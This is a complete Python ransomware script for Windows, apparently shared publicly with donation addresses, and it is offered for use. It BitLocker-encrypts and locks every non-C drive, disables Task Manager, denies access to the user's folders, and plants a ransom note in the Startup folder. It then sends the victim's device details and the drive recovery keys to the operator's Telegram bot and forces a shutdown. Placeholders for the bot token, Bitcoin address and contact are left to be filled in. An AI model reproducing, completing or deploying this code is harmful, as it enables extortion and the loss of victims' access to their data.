#Copyright 2025 © @user0x96
#Github: https://github.com/user0x96
#Donate⭐ 
#+USDT(TRC-20): TCLCdvvvgy6Pbj5VnTzaYBwGKzBDyBEyGL
#+BTC: 3EALRZzA5vp7i6kXhELTujphiJC4WwZESF
import os
import time
import string
import random
import shutil
import subprocess
import requests
import socket
import threading
import platform
import datetime

bot_token = "Enter bot_token"  # ====================== Replace with your bot token ======================
chat_id_G = "Enter chat_id_G"  # ====================== Replace with your chat IdGroup ======================

computer_name = socket.gethostname()
user_name = os.getlogin()
rootTemp = os.getenv("TEMP")

#====================== Function to return content from Http ======================
def get_http_content(url):
    try:
        response = requests.get(url, timeout=10)  
        response.raise_for_status()  
        return response.text
    except requests.exceptions.RequestException:
        pass
        return ""  

#======================  Function to shutdown the computer ====================== 
def shutdown_computer():
    try:
        subprocess.run(['shutdown', '/s', '/f', '/t', '0'], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except subprocess.CalledProcessError:
        pass

# Disable Task Manager
def disable_Task_Manager():
    subprocess.run(
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",shell=True, creationflags=subprocess.CREATE_NO_WINDOW
    )


#======================  Function to lock user folders (Desktop, Documents, Downloads, Music, Pictures, Videos) ======================
def lock_user_folders():
    user_profile = os.getenv('USERPROFILE')
    folders_to_lock = ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
    
    for folder_name in folders_to_lock:
        folder_path = os.path.join(user_profile, folder_name)
        if os.path.isdir(folder_path):
            command = ['icacls', folder_path, '/deny', 'everyone:(OI)(CI)F']
            try:
                subprocess.run(command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError:
                pass

#====================== Function  Random ID generator ======================
def generate_random_id(length=15):
    characters = string.ascii_uppercase
    return ''.join(random.choice(characters) for _ in range(length))

#====================== Function  Random Folder generator ======================
def generate_random_folder_name(length=30):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

#====================== Function creates a README.txt file and copies it to the startup directory. ======================
def create_information_file():
    try:
        random_id = generate_random_id()
        current_directory = os.getcwd()
        content = f"""\
#README
DeviceName: {computer_name}
UserName: {user_name}
ID: {random_id}
Hello :) What an unlucky day for you. But we have to inform you that. The computer
is locked and you need to contact us to unlock it. Please don't do anything stupid.
Your computer will be completely damaged. We have warned you. Regards!!
*Bitcoin(BTC): Enter Bitcoin
*Contact: Enter Contact
"""
        file_name = 'README.txt'
        file_path = os.path.join(current_directory, file_name)
        with open(file_path, 'w') as file:
            file.write(content)
        
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        destination_path = os.path.join(startup_folder, file_name)
        if os.path.exists(destination_path):
            os.remove(destination_path)
        shutil.move(file_path, destination_path)
        return random_id
    except Exception:
        return None

#====================== Function to check the existence of a drive ======================
def check_drive_exists(drive):
    return os.path.exists(f"{drive}:\\")

#====================== Function Drive lock ======================
def lock_drive(drive_letter):
    try:
        subprocess.run(
            f'manage-bde -lock {drive_letter}: -ForceDismount',shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except subprocess.CalledProcessError:
        pass

#====================== FunctionDisk protection key generation ======================
def create_drive_protector_key(drive_letter, temp_dir):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"[{drive_letter}]Key_{computer_name}_{timestamp}.txt"
        file_path = os.path.join(temp_dir, file_name)
        subprocess.run(
            f'manage-bde -on {drive_letter}: -rp -used > {file_path}',shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        with open(file_path, 'r') as f:
            key = f.read().strip()
        return file_path, key
    except Exception:
        return None, None

#====================== Function to extract key from .txt file ======================
def extract_key_info(key_file):
    key = None
    try:
        with open(key_file, 'r') as f:
            content = f.read()
            lines = content.splitlines()
            for i, line in enumerate(lines):
                if "Numerical Password:" in line:
                    # The key is usually located on the next line, starting with the number string xxx-xxx-...
                    for j in range(i + 1, len(lines)):
                        potential_key = lines[j].strip()
                        if potential_key and all(part.isdigit() and len(part) == 6 for part in potential_key.split('-')):
                            key = potential_key
                            break
                    break
                else:
                    pass
        if key:
            pass
        else:
            pass
    except Exception:
        pass
    return key

#====================== Function Get IP address ======================
def get_ip():
    try:
        resp = requests.get("https://ifconfig.me/ip", timeout=3)
        resp.raise_for_status()
        return resp.text.strip()
    except requests.RequestException:
        return "Not Found"

#====================== Function to send victim information via Telegram ======================
def send_info_to_telegram(bot_token, chat_id_G, key_info_list=None, random_id=None, max_attempts=10):
    try:
        os_info = platform.system() + " " + platform.version()
        ver_info = platform.architecture()[0]
        my_ip = get_ip()
        
        caption = (
            f"╔════ <b>Victim Info</b> ════╗\n"
            f"║  ╠═<b>DeviceName:</b> <b>{computer_name}</b>\n"
            f"║  ╠═<b>UserName:</b> <b>{user_name}</b>\n"
            f"║  ╠═<b>IP:</b> <b>{my_ip}</b>\n"
            f"║  ╠═<b>OS:</b> <b>{os_info} - {ver_info}</b>\n"
            f"║  ╠═<b>ID:</b> <code><b>{random_id}</b></code>\n"
        )

        if key_info_list:
            caption += (
                f"║\n"
                f"╠════ <b>Key Info</b> ════╗\n"
            )
            for info in key_info_list:
                if info['key']:
                    caption += f"║  ╠═<b>KeyDriver[{info['drive']}]:</b> <code><b>{info['key']}</b></code>\n"

        caption += f"╚══════════════════════╝"

        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        attempt = 0
        checksuccess = False

        while attempt < max_attempts:
            try:
                data = {'chat_id': chat_id_G, 'text': caption, 'parse_mode': 'HTML'}
                response = requests.post(message_url, data=data, timeout=30)
                if response.status_code == 200 and response.json().get('ok', False):
                    checksuccess = True
                    break
            except requests.exceptions.RequestException:
                pass
            attempt += 1
            time.sleep(2 ** attempt)

        return checksuccess
    except Exception:
        return False

#====================== Function to handle disk and send information ======================
def run_drive_protection_and_send_info(drive_letter, temp_dir, key_info_list):
    if check_drive_exists(drive_letter):
        file_path, _ = create_drive_protector_key(drive_letter, temp_dir)
        if file_path:
            # Extract key from file using extract_key_info
            key = extract_key_info(file_path)
            if key:
                key_info_list.append({'drive': drive_letter, 'key': key})
        lock_drive(drive_letter)

#======================  Function Pain ======================
def pain():
    random_id = create_information_file()
    temp_dir = os.path.join(rootTemp, generate_random_folder_name())
    os.makedirs(temp_dir, exist_ok=True)
    key_info_list = []

    # Handle drives A to Z with multithreading (Not C)
    threads = []
    for drive_letter in 'ABDEFGHIJKLMNOPQRSTUVWXYZ':
        thread = threading.Thread(
            target=run_drive_protection_and_send_info, args=(drive_letter, temp_dir, key_info_list)
        )
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Send victim information via Telegram
    send_info_to_telegram(bot_token, chat_id_G, key_info_list, random_id)

    # Lock user folder and shutdown
    lock_user_folders()
    shutdown_computer()

if __name__ == "__main__":
    pain() 